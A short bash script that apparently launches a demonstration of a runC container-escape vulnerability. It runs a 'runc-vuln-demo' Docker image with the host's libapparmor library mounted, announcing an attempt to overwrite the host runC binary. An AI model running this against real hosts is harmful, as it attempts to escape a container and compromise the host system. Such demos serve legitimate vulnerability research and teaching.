#!/bin/bash
echo "Attempting to overwrite runC binary"
echo " "
echo "docker run --rm -it -v /lib/x86_64-linux-gnu/libapparmor.so.1:/lib/x86_64-linux-gnu/libapparmor.so.1 yanivagman/runc-vuln-demo"
docker run --rm -it -v /lib/x86_64-linux-gnu/libapparmor.so.1:/lib/x86_64-linux-gnu/libapparmor.so.1 yanivagman/runc-vuln-demo
#docker run --rm -it yanivagman/runc-vuln-demo
